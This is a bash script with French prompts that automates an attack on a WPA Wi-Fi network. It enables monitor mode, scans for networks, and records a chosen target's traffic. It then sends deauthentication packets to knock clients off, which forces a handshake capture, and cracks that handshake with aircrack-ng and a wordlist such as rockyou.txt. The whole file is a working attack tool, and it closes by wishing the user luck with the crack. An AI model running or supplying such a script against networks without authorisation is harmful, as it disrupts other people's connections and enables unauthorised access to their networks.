#!/bin/bash

echo "=== Activation du mode moniteur ==="
sudo airmon-ng check kill
sudo airmon-ng start wlan0

echo ""
echo "=== Scan des réseaux disponibles (Ctrl+C pour stopper) ==="
sleep 2
sudo airodump-ng wlan0mon

echo ""
read -p "Entrez le BSSID de la cible : " bssid
read -p "Entrez le canal (CH) : " channel
read -p "Nom du fichier de capture (sans extension) : " output

echo ""
echo "=== Capture ciblée du handshake ==="
sleep 2
sudo airodump-ng -c $channel --bssid $bssid -w $output wlan0mon &
AIRODUMP_PID=$!

sleep 5
read -p "Appuyez sur Entrée pour envoyer les paquets de désauthentification (Ctrl+C pour annuler)"
sudo aireplay-ng -0 10 -a $bssid wlan0mon

echo ""
read -p "Appuyez sur Entrée pour arrêter la capture"
kill $AIRODUMP_PID

echo ""
read -p "Entrez le chemin vers votre dictionnaire (ex: /usr/share/wordlists/rockyou.txt) : " wordlist

echo ""
echo "=== Lancement du craquage avec Aircrack-ng ==="
sudo aircrack-ng -w $wordlist -b $bssid ${output}-01.cap

echo ""
echo "=== Script terminé. Bonne chance pour le crack ! ==="

